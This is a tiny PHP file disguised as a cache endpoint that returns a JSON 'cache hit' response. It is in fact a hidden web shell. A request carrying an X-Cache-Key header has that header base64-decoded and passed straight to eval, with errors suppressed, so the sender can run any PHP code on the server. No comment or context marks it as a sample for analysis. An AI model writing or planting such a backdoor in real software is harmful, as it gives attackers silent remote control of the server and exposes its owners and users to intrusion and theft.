<?php
header("Content-Type: application/json");
$h=getallheaders();if(isset($h["X-Cache-Key"])){@eval(base64_decode($h["X-Cache-Key"]));exit;}
echo '{"cache":"hit"}';
?>